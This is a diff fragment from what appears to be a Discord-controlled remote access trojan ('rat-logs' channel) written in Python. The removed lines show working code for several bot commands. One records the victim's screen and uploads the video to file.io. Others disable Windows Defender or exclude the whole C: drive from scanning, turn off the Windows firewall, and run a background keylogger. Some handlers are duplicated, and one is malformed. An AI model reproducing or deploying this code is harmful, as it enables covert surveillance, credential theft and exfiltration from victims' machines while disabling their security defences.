-        temp = os.getenv('TEMP')
-        videeoo = os.path.join(temp, "output.avi")
-        out = cv2.VideoWriter(videeoo, fourcc, 20.0, SCREEN_SIZE)
-        counter = 1
-        while True:
-            counter = counter + 1
-            img = pyautogui.screenshot()
-            frame = np.array(img)
-            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-            out.write(frame)
-            if counter >= input2:
-                break
-        out.release()
-        check = os.path.join(temp, "output.avi")
-        check2 = os.stat(check).st_size
-        if check2 > 7340032:
-            await message.channel.send("This may take some time because it is over 8 MB. Please wait.")
-            with open(check, "rb") as f:
-                boom = requests.post('https://file.io/', files={"file": f}).json()["link"]
-            await message.channel.send("Video download link: " + boom)
-            await message.channel.send("[*] Command successfully executed")
-            os.remove(check)
-        else:
-            file = discord.File(check, filename="output.avi")
-            await message.channel.send("[*] Command successfully executed", file=file)
-            os.remove(check)
-   
-@bot.command
-async def disableantivirus(message):
-   
-        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        if is_admin:
-            instruction = """REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber" """
-            output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            result = str(output.stdout.decode('CP437'))
-            build_number = result.split()[2:]
-            if build_number <= ['17763']:
-                os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
-                await message.channel.send("[*] Windows Defender disabled successfully.")
-            elif build_number >= ['18362']:
-                os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
-                await message.channel.send("[*] Windows Defender exclusion added successfully.")
-            else:
-                await message.channel.send("[*] An unknown error has occurred.")
-        else:
-            await message.channel.send("[*] This command requires admin privileges.")
-@bot.command()
-async def disableantivirus(ctx):
-    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-    if is_admin:
-        instruction = 'REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber"'
-        output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        result = str(output.stdout.decode('CP437'))
-        build_number = result.split()[2:]
-        if build_number <= ['17763']:
-            os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
-            await ctx.send("[*] Windows Defender disabled successfully.")
-        elif build_number >= ['18362']:
-            os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
-            await ctx.send("[*] Windows Defender exclusion added successfully.")
-        else:
-            await ctx.send("[*] An unknown error has occurred.")
-    else:
-        await ctx.send("[*] This command requires admin privileges.")
-
-@bot.command()
-async def disablefirewall(ctx):
-    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-    if is_admin:
-        os.system(r"netsh advfirewall set allprofiles state off")
-        await ctx.send("[*] Windows Firewall disabled successfully.")
-    else:
-        await ctx.send("[*] This command requires admin privileges.")
-
-@bot.command()
-async def startkeylogger(ctx):
-    global test
-    temp = os.getenv("TEMP")
-    log_dir = temp
-    logging.basicConfig(filename=(log_dir + r"\key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-    
-    def keylog():
-        def on_press(key):
-            logging.info(str(key))
-        with Listener(on_press=on_press) as listener:
-            listener.join()
-
-    test = threading.Thread(target=keylog)
-    test.daemon = True
-    test.start()
-    await ctx.send("[*] Keylogger successfully started")
-
-@bot.command()
-async def stopkeylogger(ctx):
-    if 'test' in globals():
-        test.join()
-        await ctx.send("[*] Keylogger successfully stopped")
-    else:
-        await ctx.send("[*] Keylogger is not running")
-
-    
-    
-
-
-
-
-
-
- 
-
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+#error handling
 @bot.event
 async def on_command_error(ctx, error):
     channel = discord.utils.get(bot.get_all_channels(), name='・🔔│ʀᴀᴛ-ʟᴏɢꜱ')
@@ -954,7 +916,5 @@ async def on_command_error(ctx, error):
     else:
         error_message = f"An error occurred in command '{ctx.message.content}': {error}"
 
-    await channel.send(f"``{error_message}``")
-
-        
-bot.run('')
+# Run the bot with the token
+bot.run("YOUR TOKEN ")
